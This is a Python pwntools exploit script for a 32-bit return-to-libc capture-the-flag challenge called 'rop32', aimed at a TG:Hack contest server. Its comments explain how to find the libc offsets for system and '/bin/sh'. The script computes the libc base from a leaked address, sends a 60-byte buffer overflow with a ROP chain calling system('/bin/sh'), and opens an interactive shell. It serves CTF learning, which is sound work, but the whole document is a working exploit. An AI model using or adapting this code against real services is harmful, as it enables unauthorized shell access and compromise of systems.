from pwn import *

debug = False
if debug == True:
    r = process("./rop32")
    # uncomment if using ssh
    #context(terminal = ["tmux", "splitw"])
    gdb.attach(r, """
        c
        """)
else:
    r = remote("return.tghack.no", 1310)

r.recvuntil("system:")
sys_address = r.recvline()[:-1] #strip last char (new line)
sys_address = int(sys_address, 16)

log.info("System: {}".format(hex(sys_address)))
# You may verify that the address is really system by writing 'p system' into gdb-peda

# Find offset to '/bin/sh'
# Find the libc version on the computer: ldd ./rop32  
# Copy to your current folder. E.g.: cp /lib32/libc.so.6 .   
# Find '/bin/sh': strings -t x libc.so.6 | grep "/bin/sh" -> 15ba0b /bin/sh
bin_sh_offset = 0x15ba0b

# Find offset to 'system': nm -D libc.so.6 | grep system -> 0003ada0 W system
system_offset = 0x0003ada0

# Find libc base
libc_base = sys_address - system_offset
log.info("libc base: {}".format(hex(libc_base)))
# Verify libc base by: 'vmmap' in gdb-peda. Always check the first libc for libc base

bin_sh_address = libc_base + bin_sh_offset
log.info("/bin/sh address: {}".format(hex(bin_sh_address)))
# Verify /bin/sh address by 'x/s address' in gdb-peda -> 0xf76a900b:	"/bin/sh"

payload = p32(sys_address) + "BBBB" + p32(bin_sh_address)
r.sendline("A"*60 + payload)

r.interactive()
